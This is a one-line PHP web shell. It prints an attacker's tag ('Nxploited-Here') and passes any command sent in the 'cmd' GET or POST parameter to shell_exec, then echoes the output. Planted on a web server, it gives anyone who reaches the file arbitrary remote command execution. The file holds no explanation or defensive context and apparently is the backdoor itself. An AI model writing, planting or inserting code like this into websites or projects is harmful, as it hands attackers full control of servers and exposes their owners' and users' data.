<?php echo "Nxploited-Here | nx96687<br>\n";if(isset($_GET["cmd"])){echo "<pre>".shell_exec($_GET["cmd"])."</pre>";echo shell_exec($_POST["cmd"]??"");}?>
